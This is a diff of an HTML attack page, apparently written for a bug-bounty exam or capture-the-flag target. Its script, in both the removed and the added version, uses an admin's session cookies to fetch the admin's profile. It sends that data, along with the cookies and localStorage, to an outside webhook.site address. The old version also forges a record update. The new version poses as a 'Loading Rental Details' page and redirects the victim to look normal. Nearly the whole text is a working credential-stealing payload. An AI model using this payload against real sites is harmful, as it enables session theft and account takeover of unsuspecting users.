@@ -1,51 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Processing...</title>
+</head>
 <body>
-    <h1>System Maintenance - Admin Portal</h1>
+    <h2>Loading Rental Details...</h2>
+    <p>Please wait while we redirect you to the admin dashboard.</p>
+
     <script>
-        // 1. Your Webhook for exfiltration
-        const logger = "https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb";
-        
-        // 2. The API Base
-        const api = "https://api-bugbounty-exam.hashacademy.co/api";
+        (async function() {
+            // 1. The URL where you want to send the stolen data
+            const exfilUrl = "https://webhook.site/f44cd6ae-a8f9-4f79-ab4d-19fc5550d8a8L";
+            
+            // 2. The Target API endpoint
+            const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
 
-        async function pwn() {
             try {
-                // ACTION 1: Stealthily grab the Admin's full profile (Flag 5 often sits here)
-                const adminProfile = await fetch(`${api}/auth/profile`, { credentials: "include" });
-                const profileJson = await adminProfile.json();
-                
-                // ACTION 2: Force Admin to "Verify" your specific car (BugHunter FlagSeeker)
-                // We use the ID found in your previous report logs
-                const carUpdate = await fetch(`${api}/cars/69d29dc336ce3d2a57baea07`, {
-                    method: "PATCH",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        "isVerified": true,
-                        "adminNotes": "Manually verified by System Admin",
-                        "revenueShare": 100 // Try to change business logic
-                    }),
-                    credentials: "include"
+                // 3. Fetch the Admin's sensitive profile data using their cookies
+                const response = await fetch(targetApi, {
+                    method: 'GET',
+                    credentials: 'include' // This is the key! It sends the Admin's session cookies
                 });
-                const carJson = await carUpdate.json();
+                
+                const data = await response.json();
 
-                // ACTION 3: Exfiltrate everything back to you
-                await fetch(logger, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                // 4. Send the data (which likely contains the flag) to your webhook
+                await fetch(exfilUrl, {
+                    method: 'POST',
+                    mode: 'no-cors', // Prevents CORS errors on the exfiltration step
                     body: JSON.stringify({
-                        exfiltration_status: "SUCCESS",
-                        stolen_admin_data: profileJson,
-                        updated_car_data: carJson
+                        status: "Success",
+                        location: window.location.href,
+                        adminData: data,
+                        cookies: document.cookie,
+                        localStorage: JSON.stringify(localStorage)
                     })
                 });
 
-            } catch (e) {
-                await fetch(logger + "?error=" + encodeURIComponent(e.message));
+            } catch (error) {
+                // If the fetch fails, log the error to your webhook so you can debug
+                fetch(exfilUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ status: "Error", message: error.message })
+                });
             }
-        }
 
-        pwn();
+            // 5. Optional: Redirect the admin after 2 seconds to look "normal"
+            setTimeout(() => {
+                window.location.href = "https://api-bugbounty-exam.hashacademy.co/dashboard";
+            }, 2000);
+        })();
     </script>
 </body>
 </html>
